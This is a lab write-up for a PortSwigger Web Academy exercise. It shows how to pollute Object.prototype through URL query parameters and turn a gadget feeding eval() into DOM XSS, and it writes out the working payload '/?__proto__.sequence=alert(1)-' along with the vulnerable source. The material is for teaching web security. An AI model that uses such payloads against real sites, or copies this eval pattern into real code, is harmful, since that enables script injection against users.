---
{"dg-publish":true,"permalink":"/port-swigger-web-academy/prototype-pollution/client-side-prototype-pollution/lab-2/"}
---


---

## Objective: Get DOM XSS

### Manual Method

We can notice this time the last query doesn't work, but we can use this

```
/?__proto__.foo=bar
```

Verify it worked

![Pasted image 20250330143553.png](/img/user/Images/Pasted%20image%2020250330143553.png)

Now, we check source to find potential gadgets. It will be noticable in `SearchLoggerAlternative.js` .

```js
async function searchLogger() {
    window.macros = {};
    window.manager = {params: $.parseParams(new URL(location)), macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }};
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');

    if(manager.params && manager.params.search) {
        await logQuery('/logger', manager.params);
    }
}
```

We have a Sink because the use of the function `eval()`

```js
eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
```

We can also find the gadget from this line. `manager.sequence` is not being explicitly defined and is user-controllable input that is passed to `eval()`

```js
let a = manager.sequence || 1;
    manager.sequence = a + 1;
```

Now, we try to pass in the query to exploit

```
?__proto__.sequence=alert(1)
```

But we see that it does not work and returns an error in the console. Click the link at the top to jump to the line where `eval()` is called

![Pasted image 20250330145823.png](/img/user/Images/Pasted%20image%2020250330145823.png)

Put a breakpoint by clicking the line number, then refresh the page

![Pasted image 20250330150125.png](/img/user/Images/Pasted%20image%2020250330150125.png)

If we hover over the gadget reference, we can see that its value is `alert(1)1` .

![Pasted image 20250330150253.png](/img/user/Images/Pasted%20image%2020250330150253.png)

This indicates that our payload worked but because that we polluted `Object.prototype` earlier and because of this block, `sequence` has now inherited `alert(1)` and going down the line, it is concatenated by `1` , making the value of `sequence` property = `alert(1)1`

```js
let a = manager.sequence || 1;
    manager.sequence = a + 1;
```

To fix this syntax we can append `-` to our exploit

```
/?__proto__.sequence=alert(1)-
```

![Pasted image 20250330151502.png](/img/user/Images/Pasted%20image%2020250330151502.png)
